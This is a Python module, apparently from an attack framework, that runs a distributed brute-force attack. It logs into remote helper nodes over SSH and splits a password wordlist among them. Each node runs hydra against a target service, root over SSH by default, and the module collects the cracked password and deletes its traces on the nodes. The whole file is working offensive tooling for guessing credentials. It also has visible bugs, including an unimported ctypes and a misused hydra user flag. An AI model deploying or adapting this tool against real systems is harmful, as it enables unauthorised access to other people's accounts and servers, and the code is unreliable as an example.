import os,sys
lib_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "lib")
sys.path.insert(0, lib_path)
import json
import tempfile
import paramiko
import threading
import fcntl
def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁

if sys.platform == "win32":
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.GetStdHandle(-11)
    mode = ctypes.c_ulong()
    kernel32.GetConsoleMode(handle, ctypes.byref(mode))
    mode.value |= 0x0004
    kernel32.SetConsoleMode(handle, mode)

class Module:
    def __init__(self):
        self.name = "Distributed Hydra Brute-Force Orchestrator"
        self.port = None
        self.protocol = "tcp"
        self.platform = "multi"
        self.use_msf = False

    def exploit(self, target_ip=None, target_port=None, service="ssh", user="root", lhost=None): #,**kwargs):
        config_path = os.path.join(os.path.dirname(__file__), "..", "..", "nodes.json")
        if not os.path.exists(config_path):
            return False, "nodes.json 配置文件不存在"
        with open(config_path, "r") as f:
            config = json.load(f)

        nodes = config.get("nodes",[])
        if not nodes:
            return False, "没有可用的分布式节点（nodes.json 中 nodes 为空）"
        wordlist_path = config["wordlist_local"]
        if not os.path.exists(wordlist_path):
            return False, f"字典文件不存在: {wordlist_path}"

        with open(wordlist_path, "r", encoding="latin-1") as f:
            words = f.readlines()
        chunk_size = len(words) // len(nodes)
        chunks = []
        for i in range(0, len(words), chunk_size):
            chunks.append(words[i:i+chunk_size])
        if len(chunks) > len(nodes):
            chunks[-2].extend(chunks[-1])
            chunks = chunks[:-1]

        results = []
        threads = []
        for idx, node in enumerate(nodes):
            if idx >= len(chunks):
                break
            t = threading.Thread(target=self._node_worker,
                                 args=(node, chunks[idx], target_ip, target_port, service, user, results))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        for res in results:
            if res["success"]:
                return True, f"密码爆破成功！用户名: {user} 密码: {res['password']}"
        return False, "分布式爆破未找到有效密码"

    def _node_worker(self, node, word_chunk, target_ip, port, service, user, results): #,**kwargs):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(node["ip"], username=node["user"], password=node["pass"], timeout=10)
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                f.writelines(word_chunk)
                local_chunk = f.name
            remote_chunk = f"/tmp/hydra_chunk_{node['ip'].replace('.','_')}.txt"
            sftp = ssh.open_sftp()
            sftp.put(local_chunk, remote_chunk)
            sftp.close()

            cmd = f"hydra -L {user} -P {remote_chunk} {target_ip} {service} -s {port} -o /tmp/hydra_result.txt -f -t 4"
            stdin, stdout, stderr = ssh.exec_command(cmd)
            stdout.channel.recv_exit_status()

            sftp = ssh.open_sftp()
            try:
                result_file = sftp.open("/tmp/hydra_result.txt", "r")
                output = result_file.read().decode()
                if "login:" in output and "password:" in output:
                    parts = output.strip().split()
                    password = parts[-1]
                    results.append({"success": True, "password": password, "node": node["ip"]})
                result_file.close()
            except:
                pass
            sftp.close()
            ssh.exec_command(f"rm -f {remote_chunk} /tmp/hydra_result.txt")
            ssh.close()
            os.unlink(local_chunk)
        except Exception as e:
            print(f"\033[31m[-] 节点 {node['ip']} 执行失败: {e}\033[0m")
